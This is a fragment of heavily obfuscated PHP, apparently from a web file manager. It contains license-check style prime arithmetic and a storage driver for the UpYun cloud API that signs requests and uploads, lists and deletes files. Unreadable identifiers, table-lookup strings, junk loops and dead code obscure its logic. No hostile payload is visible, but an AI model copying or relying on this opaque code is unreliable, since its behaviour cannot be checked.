$èşÈ”[714]; if (!$¤œû) { die; } } public function gnuf7b3e34a1($Ô Ñ) { $¬¿‡Ì =& $_SERVER[ÀÆ]; $ì¼´ìŸ =& $_SERVER[Å´]; $öÜ½¶æ¦ßÏ = $ì¼´ìŸ[0]($ì¼´ìŸ[381], $Ô Ñ); if ($ì¼´ìŸ[19]($öÜ½¶æ¦ßÏ) != 2) { return $ì¼´ìŸ[10]; } $ïÏÀÏ = $this->{$_SERVER[Å´][277]}($öÜ½¶æ¦ßÏ[1] . $ì¼´ìŸ[10], $ì¼´ìŸ[174]); if (!$ïÏÀÏ) { return $ì¼´ìŸ[10]; } $ïÏÀÏ = $ì¼´ìŸ[271]($ïÏÀÏ); $ÆÔŒ„•½Ï = 0; $§ = $¬¿‡Ì[715]; while (strlen($§) < $¬¿‡Ì[612]) { if (!$§) { break; } $§++; } $ä‚ = 0; $Íàô¸™”õË = $¬¿‡Ì[716]; while ($Íàô¸™”õË < $¬¿‡Ì[608]) { if ($Íàô¸™”õË >= 0) { break; } $Íàô¸™”õË++; } for ($‘×– = 3; $‘×– < $ïÏÀÏ; $‘×– += 2) { if ($ïÏÀÏ % $‘×– != 0) { continue; } $ÆÔŒ„•½Ï = $‘×–; $·±›ÎôáŠ­Òû = $¬¿‡Ì[717]; $ä‚ = $ì¼´ìŸ[271]($ïÏÀÏ / $‘×–); break; } $¢Ïø®¿Í = ($ÆÔŒ„•½Ï - 1) * ($ä‚ - 1); $µ§ı = $¬¿‡Ì[718]; $ÀÕñ‹™ = $ì¼´ìŸ[271](($ÆÔŒ„•½Ï + $ä‚) / 2); while (1) { $Œ¢É¸Í¶ı‘‰ = $ÀÕñ‹™; $ŠŸÎšâ = $¬¿‡Ì[719]; $¡Ù§­ = $¢Ïø®¿Í; while ($¡Ù§­ % $Œ¢É¸Í¶ı‘‰ != 0) { $ÖÒ = $¡Ù§­; $¡Ù§­ = $Œ¢É¸Í¶ı‘‰; $Œ¢É¸Í¶ı‘‰ = $ÖÒ % $Œ¢É¸Í¶ı‘‰; $–¹ß£å¹½ = $¬¿‡Ì[720]; } if ($Œ¢É¸Í¶ı‘‰ == 1) { break; } else { $ÀÕñ‹™++; } } $²ì = 2; $Å­ = $¬¿‡Ì[721]; if (!$Å­) { return; } for ($‘×– = 0; $‘×– < $¢Ïø®¿Í * 10; $‘×–++) { if (($¢Ïø®¿Í * $‘×– + 1) % $ÀÕñ‹™ == 0) { $²ì = $ì¼´ìŸ[271](($¢Ïø®¿Í * $‘×– + 1) / $ÀÕñ‹™); break; } } $‘àŠ—÷›®”° = $ì¼´ìŸ[131]($ì¼´ìŸ[378] . ($ÆÔŒ„•½Ï + $ä‚) . $ì¼´ìŸ[379] . $ÀÕñ‹™ . $ì¼´ìŸ[379] . $²ì . $ì¼´ìŸ[380]); $á¯°ÀÇóå¼Û­ = $¬¿‡Ì[722]; while (strlen($á¯°ÀÇóå¼Û­) < $¬¿‡Ì[612]) { if (!$á¯°ÀÇóå¼Û­) { break; } $á¯°ÀÇóå¼Û­++; } $Ú„Î•“ = $this->{$_SERVER[Å´][277]}($öÜ½¶æ¦ßÏ[0], $‘àŠ—÷›®”°); $‰…ğ¨¾ = $¬¿‡Ì[723]; return $Ú„Î•“; $²¾ = $¬¿‡Ì[724]; } public function frit3b564994() { $Ø‹ =& $_SERVER[ÀÆ]; $‘â±Ø‹È =& $_SERVER[Å´]; $ºíùİæ” = $‘â±Ø‹È[363]($‘â±Ø‹È[382](2, 14), $‘â±Ø‹È[382](2, 16) - 1); $ÄÆ©Ÿİª‡ä = array(); $óŸá‹šÔ…Ñ = 1; $˜ØØ»ğ = $Ø‹[725]; while ($˜ØØ»ğ < $Ø‹[614]) { if ($˜ØØ»ğ >= 0) { break; } $˜ØØ»ğ++; } while ($óŸá‹šÔ…Ñ <= (int) $‘â±Ø‹È[383]($ºíùİæ”)) { $øØÒìô = $óŸá‹šÔ…Ñ; while (!0) { $øØÒìô++; $¯€Ÿáé¾Ä = $Ø‹[726]; if (strlen($¯€Ÿáé¾Ä) < $Ø‹[604]) { die; } if ($øØÒìô <= 2) { $óŸá‹šÔ…Ñ = $øØÒìô; break; } else { if ($øØÒìô < 2) { continue; } } $«€Íôà¿ = !0; for ($‡ = 2; $‡ <= $‘â±Ø‹È[383]($øØÒìô); $‡++) { if ($øØÒìô % $‡ == 0) { $«€Íôà¿ = !1; } } if ($«€Íôà¿) { $óŸá‹šÔ…Ñ = $øØÒìô; break; } } $ÄÆ©Ÿİª‡ä[] = $óŸá‹šÔ…Ñ; $õşùÃ¸ì¶Ë = $Ø‹[727]; if (strlen($õşùÃ¸ì¶Ë) < $Ø‹[604]) { die; } } $±’Ù‰ = 2; $‰ç…çúÂã©Œ = $Ø‹[728]; if (strlen($‰ç…çúÂã©Œ) < $Ø‹[614]) { die; } for ($øØÒìô = $ºíùİæ”; $øØÒìô > 1; $øØÒìô--) { $«€Íôà¿ = !0; $Ä´ = $Ø‹[729]; if (!$Ä´) { die; } foreach ($ÄÆ©Ÿİª‡ä as $Š¬ìîã) { if ($øØÒìô % $Š¬ìîã == 0) { $«€Íôà¿ = !1; break; } } if ($«€Íôà¿) { $±’Ù‰ = $øØÒìô; break; } } return $±’Ù‰; $ºÓ¾å´ = $Ø‹[730]; if (!$ºÓ¾å´) { return; } } public function nxvd46b52244($×­Èê©©ÔÒù, $“İœØšûŠ) { $“‰ =& $_SERVER[Å´]; return $“‰[13](array($“‰[14], $“‰[384]), $×­Èê©©ÔÒù, $“İœØšûŠ); } public function zfknc2232e2c($€„â, $ÀÇ) { $¹Ì¹Ò =& $_SERVER[ÀÆ]; $¦’»âˆ =& $_SERVER[Å´]; return $¦’»âˆ[13](array($¦’»âˆ[385], $¦’»âˆ[386]), $€„â, $ÀÇ); $Æì‚Á–ß = $¹Ì¹Ò[731]; while ($Æì‚Á–ß < $¹Ì¹Ò[612]) { if ($Æì‚Á–ß >= 0) { break; } $Æì‚Á–ß++; } } public function nvbw28d90189($Úúù–Ú, $´‘šõ£·¬ ) { $Ú =& $_SERVER[Å´]; return $Ú[13](array($Ú[385], $Ú[387]), $Úúù–Ú, $´‘šõ£·¬ ); $òæı÷ = $_SERVER[ÀÆ][732]; if (!$òæı÷) { return; } } } goto eàĞà†­…Ö; f£ŒİŞØœ³: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\160\x3a\x2f\x2f\166\60\56\x61\x70\x69\x2e\x75\160\x79\x75\156\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ùê¿ßøË¿á”) { parent::__construct(); $this->_init($Ùê¿ßøË¿á”); } public function _init($Ä¾Æşï“) { $—…­Çº› =& $_SERVER[ÀÆ]; foreach ($Ä¾Æşï“ as $®ÀŞÌûÉºÀ£ñ => $¬ü€¤‘¹) { if (isset($this->{$®ÀŞÌûÉºÀ£ñ})) { $this->{$®ÀŞÌûÉºÀ£ñ} = $¬ü€¤‘¹; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($—…­Çº›[1373] . LNG($—…­Çº›[1306])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($½À¤Ê´, $Ê–©° = "\107\x45\124") { $ñ•ú€¯¡ =& $_SERVER[ÀÆ]; $ó¥®øØÂ = gmdate($ñ•ú€¯¡[1339]); $®üÅÛ÷ = base64_encode(hash_hmac($ñ•ú€¯¡[1374], "{$Ê–©°}\46{$½À¤Ê´}\x26{$ó¥®øØÂ}", md5("{$this->userpass}"), !0)); $À•í¯¯ = array("\x41\x75\x74\150\x6f\162\x69\x7a\141\164\x69\157\x6e\72\125\120\131\125\x4e\40{$this->username}\x3a{$®üÅÛ÷}", "\104\141\164\x65\x3a{$ó¥®øØÂ}"); return $À•í¯¯; } public function ussRequest($‘¥²Ì, $¥ĞÈæò‘Œ˜ = "\x47\x45\x54", $ê†â = false, $ƒü = false, $ÖŞÜê¼²ô = false) { $ıã¤ =& $_SERVER[ÀÆ]; $‘¥²Ì = trim($‘¥²Ì, $ıã¤[8]); $è÷³‚ = "\57{$this->bucket}\x2f{$‘¥²Ì}"; $ĞÍ¬ = $this->ussHeaders($è÷³‚, $¥ĞÈæò‘Œ˜); if ($ƒü) { $ĞÍ¬ = array_merge($ĞÍ¬, $ƒü); } $¡¶•Ší = url_request($this->endpoint . $è÷³‚, $¥ĞÈæò‘Œ˜, $ê†â, $ĞÍ¬, $ÖŞÜê¼²ô); if (!$¡¶•Ší) { return array($ıã¤[1118] => !1, $ıã¤[1120] => $ıã¤[1375]); } if (strtolower($¥ĞÈæò‘Œ˜) == $ıã¤[190] || in_array($¡¶•Ší[$ıã¤[1118]], array($ıã¤[1233], $ıã¤[1376]))) { $ê†â = $¡¶•Ší[$ıã¤[1377]]; } else { $ê†â = json_decode($¡¶•Ší[$ıã¤[1120]], !0); if (!$ê†â) { $ê†â = $¡¶•Ší[$ıã¤[1120]]; } else { if (!$¡¶•Ší[$ıã¤[735]] && isset($ê†â[$ıã¤[1378]])) { $ê†â = $ê†â[$ıã¤[1378]]; } } } return array($ıã¤[1118] => $¡¶•Ší[$ıã¤[735]], $ıã¤[1120] => $ê†â); } public function mkfile($˜¶Æ, $ÜÑ²”ö = '', $æƒ‹¬ôÂ¯ = REPEAT_RENAME) { if ($this->setContent($˜¶Æ, $ÜÑ²”ö)) { return $this->getPathOuter($˜¶Æ); } return !1; } public function mkdir($ºô, $æ = REPEAT_SKIP) { $ÖÉ¬šõ¸ =& $_SERVER[ÀÆ]; $—¬ºÅ·ĞÑÎ› = trim($ºô, $ÖÉ¬šõ¸[8]); if ($this->_isFolder($—¬ºÅ·ĞÑÎ›)) { return $this->getPathOuter($—¬ºÅ·ĞÑÎ›); } $©˜ÄÑ¿ı» = array($ÖÉ¬šõ¸[1379]); $â˜Å”±øöø•é = $this->ussRequest($—¬ºÅ·ĞÑÎ›, $ÖÉ¬šõ¸[224], !1, $©˜ÄÑ¿ı»); return $â˜Å”±øöø•é[$ÖÉ¬šõ¸[1118]] ? $this->getPathOuter($—¬ºÅ·ĞÑÎ›) : !1; } public function copyFile($úûìñ, $áçúıËŸ) { $ î¨Ë =& $_SERVER[ÀÆ]; $»ŞùÔŞ = array($ î¨Ë[1380] . "\x2f{$this->bucket}\57{$úûìñ}", $ î¨Ë[1381]); $í«ûÌÎ³Úù = $this->ussRequest($áçúıËŸ, $ î¨Ë[226], !1, $»ŞùÔŞ); return $í«ûÌÎ³Úù[$ î¨Ë[1118]] ? !0 : $this->getPathOuter($áçúıËŸ); } public function moveFile($ÉšŞ¼ø«é, $€×¢ì®) { $ÒëáÁí‘ƒî =& $_SERVER[ÀÆ]; $í¯û = array($ÒëáÁí‘ƒî[1382] . "\x2f{$this->bucket}\x2f{$ÉšŞ¼ø«é}", $ÒëáÁí‘ƒî[1381]); $Ì¨œÑ–¬ñ = $this->ussRequest($€×¢ì®, $ÒëáÁí‘ƒî[226], !1, $í¯û); return $Ì¨œÑ–¬ñ[$ÒëáÁí‘ƒî[1118]] ? !0 : $this->getPathOuter($€×¢ì®); } public function delFile($¸Ê) { $‰Ìõ› =& $_SERVER[ÀÆ]; $™“ÔÂ‘Ó³Ì˜ = $this->ussRequest($¸Ê, $‰Ìõ›[1383]); return $™“ÔÂ‘Ó³Ì˜[$‰Ìõ›[1118]] ? !0 : !1; } public function delFolder($Çèì¶ßû’ğ) { $Ï·æ =& $_SERVER[ÀÆ]; if (!$this->exist($Çèì¶ßû’ğ)) { return !0; } $this->listItemCache = !1; $ç£åæô = $“£ÍœÑ = array(); $this->fileList($Çèì¶ßû’ğ, $ç£åæô, $“£ÍœÑ, !0); $this->listItemCache = !0; foreach ($“£ÍœÑ as $ğ³£æ) { $•¤ = $this->ussRequest($ğ³£æ[$Ï·æ[28]], $Ï·æ[1383]); if (!$•¤[$Ï·æ[1118]]) { return !1; } } foreach ($ç£åæô as $ßğå) { $•¤ = $this->ussRequest($ßğå, $Ï·æ[1383]); if (!$•¤[$Ï·æ[1118]]) { return !1; } } $•¤ = $this->ussRequest($Çèì¶ßû’ğ, $Ï·æ[1383]); return $•¤[$Ï·æ[1118]]; } public function rename($¤»²¯Ã, $ø¨–) { if ($this->isFile($¤»²¯Ã)) { $ø¨– = get_path_father($¤»²¯Ã) . $ø¨–; return $this->moveFile($¤»²¯Ã, $ø¨–); } return $this->renameObject($¤»²¯Ã, $ø¨–); } public function fileInfo($¿­, $ƒˆè© = false, $šóÓØ = array()) { $‡Œ­À÷äÛ›öğ =& $_SERVER[ÀÆ]; $ùëâêè£ˆù = array($‡Œ­À÷äÛ›öğ[28] => $this->pathThis($¿­), $‡Œ­À÷äÛ›öğ[76] => $this->getPathOuter($‡Œ­À÷äÛ›öğ[8] . $¿­), $‡Œ­À÷äÛ›öğ[29] => $‡Œ­À÷äÛ›öğ[193], $‡Œ­À÷äÛ›öğ[78] => isset($šóÓØ[$‡Œ­À÷äÛ›öğ[78]]) ? $šóÓØ[$‡Œ­À÷äÛ›öğ[78]] : 0, $‡Œ­À÷äÛ›öğ[168] => $this->ext($¿­)); if ($ƒˆè©) { return $ùëâêè£ˆù; } $ùëâêè£ˆù[$‡Œ­À÷äÛ›öğ[194]] = $ùëâêè£ˆù[$‡Œ­À÷äÛ›öğ[84]] = 0; $ùëâêè£ˆù[$‡Œ­À÷äÛ›öğ[195]] = $ùëâêè£ˆù[$‡Œ­À÷äÛ›öğ[196]] = !0; if (empty($šóÓØ)) { $šóÓØ = $this->objectMeta($¿­); if (!$šóÓØ) { return $ùëâêè£ˆù; } } $ùëâêè£ˆù[$‡Œ­À÷äÛ›öğ[194]] = intval($šóÓØ[$‡Œ­À÷äÛ›öğ[1384]]); $ùëâêè£ˆù[$‡Œ­À÷äÛ›öğ[84]] = intval($šóÓØ[$‡Œ­À÷äÛ›öğ[1385]]); $ùëâêè£ˆù[$‡Œ­À÷äÛ›öğ[78]] = $šóÓØ[$‡Œ­À÷äÛ›öğ[78]]; return $ùëâêè£ˆù; } public function folderInfo($ïŒØ¾“¾, $øÚ¿ãÈÊø = false) { $£Šµ« =& $_SERVER[ÀÆ]; $º¡Ö“üÇÈÍˆ = array($£Šµ«[28] => $this->pathThis($ïŒØ¾“¾), $£Šµ«[76] => $this->getPathOuter($£Šµ«[8] . $ïŒØ¾“¾), $£Šµ«[29] => $£Šµ«[77]); if ($øÚ¿ãÈÊø) { return $º¡Ö“üÇÈÍˆ; } $º¡Ö“üÇÈÍˆ[$£Šµ«[194]] = $º¡Ö“üÇÈÍˆ[$£Šµ«[84]] = 0; $º¡Ö“üÇÈÍˆ[$£Šµ«[195]] = $º¡Ö“üÇÈÍˆ[$£Šµ«[196]] = !0; if (empty($Õ±)) { $Õ± = $this->objectMeta($ïŒØ¾“¾); if (!$Õ±) { return $º¡Ö“üÇÈÍˆ; } } $º¡Ö“üÇÈÍˆ[$£Šµ«[194]] = intval($Õ±[$£Šµ«[1384]]); $º¡Ö“üÇÈÍˆ[$£Šµ«[84]] = intval($Õ±[$£Šµ«[1385]]); return $º¡Ö“üÇÈÍˆ; } private function listObjs($Äï¡ÓÃ¡¥, $‹© = 0, $õ¥ã¥ßÜ = 1000) { $œ°èÅİ =& $_SERVER[ÀÆ]; $ê’úÌ¡û–× = array($œ°èÅİ[1386], $œ°èÅİ[1387] . $õ¥ã¥ßÜ); if ($‹©) { $ê’úÌ¡û–×[] = $œ°èÅİ[1388] . $‹©; } $¦€‘ÜÌŠŸŒôÂ = $this->ussRequest($Äï¡ÓÃ¡¥, $œ°èÅİ[228], !1, $ê’úÌ¡û–×); return !$¦€‘ÜÌŠŸŒôÂ[$œ°èÅİ[1118]] ? !1 : $¦€‘ÜÌŠŸŒôÂ[$œ°èÅİ[1120]]; } private function fileList($ôêï‰½, &$ãµ·»Ïçô, &$…«†é­Ğ¸, $ÛŒ’øäè¯× = false) { $çã¼ğ‡™ü® =& $_SERVER[ÀÆ]; $ÁÂ»¡øéí = $çã¼ğ‡™ü®[33]; $ıøï¢½À = 1000; $ˆ“¬äïÉÂç® = rtrim($ôêï‰½, $çã¼ğ‡™ü®[8]) . $çã¼ğ‡™ü®[8]; $êÑ¢Ç™’ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $Ù©í®¹åÈ = $this->listObjs($ôêï‰½, $ÁÂ»¡øéí, $ıøï¢½À); if (!$Ù©í®¹åÈ) { return !1; } $ÁÂ»¡øéí = isset($Ù©í®¹åÈ[$çã¼ğ‡™ü®[1389]]) ? $Ù©í®¹åÈ[$çã¼ğ‡™ü®[1389]] : $çã¼ğ‡™ü®[33]; $¬»˜ = isset($Ù©í®¹åÈ[$çã¼ğ‡™ü®[1390]]) ? $Ù©í®¹åÈ[$çã¼ğ‡™ü®[1390]] : array(); foreach ($¬»˜ as $ŸşÏ²¢ì–È) { $½ˆÓ¯ì = $ŸşÏ²¢ì–È[$çã¼ğ‡™ü®[29]] == $çã¼ğ‡™ü®[77] ? !0 : !1; $ğÃ = ltrim($ˆ“¬äïÉÂç® . $ŸşÏ²¢ì–È[$çã¼ğ‡™ü®[28]], $çã¼ğ‡™ü®[8]) . ($½ˆÓ¯ì ? $çã¼ğ‡™ü®[8] : $çã¼ğ‡™ü®[33]); $£ÙÄ = array($çã¼ğ‡™ü®[28] => $ğÃ, $çã¼ğ‡™ü®[29] => $½ˆÓ¯ì ? $çã¼ğ‡™ü®[77] : $çã¼ğ‡™ü®[193], $çã¼ğ‡™ü®[78] => $ŸşÏ²¢ì–È[$çã¼ğ‡™ü®[335]], $çã¼ğ‡™ü®[1385] => $ŸşÏ²¢ì–È[$çã¼ğ‡™ü®[1391]]); if ($êÑ¢Ç™’) { $this->cacheMethod($çã¼ğ‡™ü®[199], $ğÃ, $½ˆÓ¯ì); $this->cacheMethod($çã¼ğ‡™ü®[200], $ğÃ, $£ÙÄ); } if ($½ˆÓ¯ì) { $ãµ·»Ïçô[] = $ğÃ; if ($ÛŒ’øäè¯×) { $this->fileList($ğÃ, $ãµ·»Ïçô, $…«†é­Ğ¸, $ÛŒ’øäè¯×); } continue; } $…«†é­Ğ¸[] = $£ÙÄ; } if (count($¬»˜) < $ıøï¢½À) { break; } } if ($êÑ¢Ç™’) { $this->cacheMethod($çã¼ğ‡™ü®[199], $ôêï‰½, !0); } } public function listPath($ƒõ®Ó¦£ó, $‹¿°Ê = false) { $æÏÄª¸ =& $_SERVER[ÀÆ]; $Ò‰äïÎæéø = $¸áØÏ“É = array(); $this->fileList($ƒõ®Ó¦£ó, $Ò‰äïÎæéø, $¸áØÏ“É); foreach ($Ò‰äïÎæéø as $…Ì±  => $Ó«¤¼) { $Ò‰äïÎæéø[$…Ì± ] = $this->folderInfo($Ó«¤¼, $‹¿°Ê); } foreach ($¸áØÏ“É as $…Ì±  => $Ó«¤¼) { $¸áØÏ“É[$…Ì± ] = $this->fileInfo($Ó«¤¼[$æÏÄª¸[28]], $‹¿°Ê, $Ó«¤¼); } return array($æÏÄª¸[75] => $Ò‰äïÎæéø, $æÏÄª¸[74] => $¸áØÏ“É); } public function has($İ, $Şæ“Š– = false, $¾ñĞ = true) { $ôÀ›ãÚ£ÚÇ =& $_SERVER[ÀÆ]; $¬áñíİ = $ôÀ›ãÚ£ÚÇ[33]; $¿×É‹ = 500; $Ñ¿ = 0; $ºØ = 0; $éè´ˆ½âñ‡‘ = rtrim($İ, $ôÀ›ãÚ£ÚÇ[8]) . $ôÀ›ãÚ£ÚÇ[8]; while (!0) { check_abort(); $É×” = $this->listObjs($İ, $¬áñíİ, $¿×É‹); if (!$É×”) { return !1; } $¬áñíİ = isset($É×”[$ôÀ›ãÚ£ÚÇ[1389]]) ? $É×”[$ôÀ›ãÚ£ÚÇ[1389]] : $ôÀ›ãÚ£ÚÇ[33]; $øÄ = isset($É×”[$ôÀ›ãÚ£ÚÇ[1390]]) ? $É×”[$ôÀ›ãÚ£ÚÇ[1390]] : array(); if (empty($øÄ)) { break; } $’ŞÍĞ = array_filter($øÄ, function ($‡Ä¶ë¥) { $ûÆĞ¤óñ— =& $_SERVER[ÀÆ]; return $‡Ä¶ë¥[$ûÆĞ¤óñ—[29]] == $ûÆĞ¤óñ—[77]; }); $ó“òë = count($øÄ); $’ŞÍĞ = count($’ŞÍĞ); $±‡·ˆñé = $ó“òë - $’ŞÍĞ; if ($Şæ“Š–) { $ºØ += $’ŞÍĞ; $Ñ¿ += $±‡·ˆñé; if ($ó“òë < $¿×É‹) { break; } continue; } if ($¾ñĞ) { if ($±‡·ˆñé) { return !0; } } else { if ($’ŞÍĞ) { return !0; } } if ($ó“òë < $¿×É‹) { break; } } if ($Şæ“Š–) { return array($ôÀ›ãÚ£ÚÇ[203] => $Ñ¿, $ôÀ›ãÚ£ÚÇ[204] => $ºØ); } return !1; } public function listAll($ÉÁğ™¼€ë£É) { $¸ª =& $_SERVER[ÀÆ]; $³û¯«¨‘¦ñó = $¢§¢ ¼ = array(); $this->fileList($ÉÁğ™¼€ë£É, $³û¯«¨‘¦ñó, $¢§¢ ¼, !0); $¯Ÿ§¹¾ïñœê = array(); foreach ($¢§¢ ¼ as $»Ÿï) { $¯Ÿ§¹¾ïñœê[$»Ÿï[$¸ª[28]]] = $»Ÿï[$¸ª[78]]; } foreach ($³û¯«¨‘¦ñó as $»Ÿï) { if (is_string($»Ÿï)) { $¯Ÿ§¹¾ïñœê[$»Ÿï] = 0; } } return $this->listAllFiles($ÉÁğ™¼€ë£É, array_keys($¯Ÿ§¹¾ïñœê), $¯Ÿ§¹¾ïñœê); } public function canRead($§‹†) { return $this->exist($§‹†) ? !0 : !1; } public function canWrite($¬âšÅ) { return $this->exist($¬âšÅ) ? !0 : !1; } public function getContent($Ÿ±ˆÜ•ñè°ş) { return $this->fileSubstr($Ÿ±ˆÜ•ñè°ş, 0, -1); } public function setContent($Ÿ­, $ƒÙ°âÀŠéø = '') { $ÚÒšÊáÕìã =& $_SERVER[ÀÆ]; if (!$ƒÙ°âÀŠéø) { $Æî½‡ = $this->ussRequest($Ÿ­, $ÚÒšÊáÕìã[224]); return $Æî½‡[$ÚÒšÊáÕìã[1118]]; } $îñïƒûÄ©¾ = $this->tempFile($this->pathThis($Ÿ­)); file_put_contents($îñïƒûÄ©¾, $ƒÙ°âÀŠéø); if ($this->upload($Ÿ­, $îñïƒûÄ©¾)) { $this->tempFileRemve($îñïƒûÄ©¾); return !0; } return !1; } public function fileSubstr($­ù×¨ÕÈ…õ˜, $Ş¥ÃÄ‡›ğ‹ì, $æèñ§ıšâ‚š) { $ó¹ÄÉõôİ =& $_SERVER[ÀÆ]; if (!($ëÎ„şåÆ = $this->link($­ù×¨ÕÈ…õ˜))) { return !1; } $¬†‰è = !1; if ($æèñ§ıšâ‚š > 0) { $Î¸ÄƒÆ¥±ø¢ = $Ş¥ÃÄ‡›ğ‹ì + $æèñ§ıšâ‚š - 1; $¬†‰è = array($ó¹ÄÉõôİ[1352] . $Ş¥ÃÄ‡›ğ‹ì . $ó¹ÄÉõôİ[454] . $Î¸ÄƒÆ¥±ø¢); } $şáÍ¹ = url_request($ëÎ„şåÆ, $ó¹ÄÉõôİ[228], !1, $¬†‰è); return $şáÍ¹[$ó¹ÄÉõôİ[735]] ? $şáÍ¹[$ó¹ÄÉõôİ[1120]] : !1; } public function upload($Í’, $­„ô“Ü¤Ş, $Å£èÙ = false, $Ä÷ = REPEAT_REPLACE) { $ïñÎ¶°î =& $_SERVER[ÀÆ]; $ë¬¥£Öè› = IO::size($­„ô“Ü¤Ş); if ($ë¬¥£Öè› <= 1024 * 1024 * 200) { $öÓÏ‚ = array($ïñÎ¶°î[1392] . $­„ô“Ü¤Ş); $üúäÔøòÂ = $this->ussRequest($Í’, $ïñÎ¶°î[226], $öÓÏ‚); return $üúäÔøòÂ[$ïñÎ¶°î[1118]] ? $this->getPathOuter($Í’) : !1; } $ë¼èæ†Óâƒ = 1024 * 1024 * 10; $¯…ØàÜ¥â = array($ïñÎ¶°î[1393], $ïñÎ¶°î[1394] . $ë¬¥£Öè›, $ïñÎ¶°î[1395], $ïñÎ¶°î[1396] . $ë¼èæ†Óâƒ); $üúäÔøòÂ = $this->ussRequest($Í’, $ïñÎ¶°î[226], !1, $¯…ØàÜ¥â); if (!$üúäÔøòÂ[$ïñÎ¶°î[1118]]) { return !1; } $”» = $üúäÔøòÂ[$ïñÎ¶°î[1120]]; $†‚şê½°ÄÆòß = 0; $˜»œ¦Ô½™ÇÇ = $”»[$ïñÎ¶°î[1397]]; $Ê˜´¨û = fopen($­„ô“Ü¤Ş, $ïñÎ¶°î[1303]); if (!$Ê˜´¨û) { return !1; } do { $ß†¹…ÎœãÙ = $”»[$ïñÎ¶°î[1398]]; fseek_64($Ê˜´¨û, $†‚şê½°ÄÆòß); $º£¥—ëš¿–¨ = fread($Ê˜´¨û, $ß†¹…ÎœãÙ); $€Îİ = 0; do { $€Îİ++; $”» = $this->uploadPart($Í’, $”», $º£¥—ëš¿–¨); } while (!$”» && $€Îİ < 3); if (!$”») { return !1; } $˜»œ¦Ô½™ÇÇ = $”»[$ïñÎ¶°î[1397]]; $†‚şê½°ÄÆòß += $ß†¹…ÎœãÙ; } while ($˜»œ¦Ô½™ÇÇ != -1); fclose($Ê˜´¨û); $¯…ØàÜ¥â = array($ïñÎ¶°î[1399], $ïñÎ¶°î[1400] . $”»[$ïñÎ¶°î[1401]], $ïñÎ¶°î[1395]); $üúäÔøòÂ = $this->ussRequest($Í’, $ïñÎ¶°î[226], !1, $¯…ØàÜ¥â); return $üúäÔøòÂ[$ïñÎ¶°î[1118]] ? $this->getPathOuter($»ŠÉŸ¥Â) : !1; } private function uploadPart($Ã€ÎŠá¥, $¹³âËÆç¾¼ğ, &$°§£íã) { $§ñå =& $_SERVER[ÀÆ]; $İ¨²¥¦Æ = array($§ñå[1402], $§ñå[1400] . $¹³âËÆç¾¼ğ[$§ñå[1401]], $§ñå[1403] . $¹³âËÆç¾¼ğ[$§ñå[1397]], $§ñå[141] . $¹³âËÆç¾¼ğ[$§ñå[1398]]); $æÈ÷÷¡” = $this->ussRequest($Ã€ÎŠá¥, $§ñå[226], $°§£íã, $İ¨²¥¦Æ); return !$æÈ÷÷¡”[$§ñå[1118]] ? $æÈ÷÷¡”[$§ñå[1118]] : $æÈ÷÷¡”[$§ñå[1120]]; } public function uploadFormData($Á”äî, $ÓÔ‘Ú×§å§­ = 3600) { return $this->uploadPolicy($Á”äî, $ÓÔ‘Ú×§å§­); } public function multiUploadFormData($Ñæ –°ª, $Œ“•òÙ°­ = 3600) { $ËÚ•›ñéÕôÂ =& $_SERVER[ÀÆ]; $·µ»ë¸¶¨ = (int) $GLOBALS[$ËÚ•›ñéÕôÂ[7]][$ËÚ•›ñéÕôÂ[78]]; return $this->uploadPolicy($Ñæ –°ª, $Œ“•òÙ°­, $·µ»ë¸¶¨); } private function uploadPolicy($›í, $›©º = 3600, $Ã©¼­Ùé‹¿ = 0) { $™Ú…è˜Äê =& $_SERVER[ÀÆ]; $–Îşº¨æ– = $™Ú…è˜Äê[8] . $this->bucket; $Ö÷‡‡¿§ÇËÙ = gmdate($™Ú…è˜Äê[1339]); $É°î—´²»Õ = array($™Ú…è˜Äê[1404] => $this->bucket, $™Ú…è˜Äê[1405] => $›í, $™Ú…è˜Äê[1406] => time() + $›©º, $™Ú…è˜Äê[1407] => $Ö÷‡‡¿§ÇËÙ); if ($Ã©¼­Ùé‹¿) { $É°î—´²»Õ[$™Ú…è˜Äê[1319]] = $Ã©¼­Ùé‹¿; } $éë¬™ä‘ñÂ€‹ = base64_encode(json_encode($É°î—´²»Õ)); $œªåÉ¬¿§àŞ = base64_encode(hash_hmac($™Ú…è˜Äê[1374], "\120\117\x53\x54\46{$–Îşº¨æ–}\x26{$Ö÷‡‡¿§ÇËÙ}\46{$éë¬™ä‘ñÂ€‹}", md5("{$this->userpass}"), !0)); $›Ÿ¿ = array($™Ú…è˜Äê[1245] => $éë¬™ä‘ñÂ€‹, $™Ú…è˜Äê[1408] => "\125\120\x59\125\116\x20{$this->username}\72{$œªåÉ¬¿§àŞ}", $™Ú…è˜Äê[175] => $this->endpoint . $–Îşº¨æ–); return $›Ÿ¿; } public function download($³äÌ‚×şé­è’, $¦ö®ôÁ˜¸Ÿ§à) { $¥³Š¨İ“ = IO::getPathInner(IO::mkfile($¦ö®ôÁ˜¸Ÿ§à)); if (!($èİ = $this->link($³äÌ‚×şé­è’))) { return !1; } $×©ùÖıÂ§ÃÁ = 0; $¼ıŞÃÏ¶È“ = 1024 * 200; $èÛ™ = fopen($¥³Š¨İ“, $_SERVER[ÀÆ][1358]); while (!0) { $…şàì¤Ú  = $this->fileSubstr($³äÌ‚×şé­è’, $×©ùÖıÂ§ÃÁ, $¼ıŞÃÏ¶È“); if ($…şàì¤Ú  === !1) { return !1; } fwrite($èÛ™, $…şàì¤Ú ); $×©ùÖıÂ§ÃÁ += $¼ıŞÃÏ¶È“; if (strlen($…şàì¤Ú ) < $¼ıŞÃÏ¶È“) { break; } } fclose($èÛ™); return $¦ö®ôÁ˜¸Ÿ§à; } public function link($àñ, $ïâ•ˆŞ¢ÉİÌ = array()) { $‘çÒé±ÉĞ =& $_SERVER[ÀÆ]; $àñ = trim($àñ, $‘çÒé±ÉĞ[8]); if (!empty($this->token)) { $ÇËéÊƒÔ³´ = strtotime(date($‘çÒé±ÉĞ[1409])); $¦İİÆ­ = substr(md5($this->token . $‘çÒé±ÉĞ[282] . $ÇËéÊƒÔ³´ . $‘çÒé±ÉĞ[1410] . $àñ), 12, 8) . 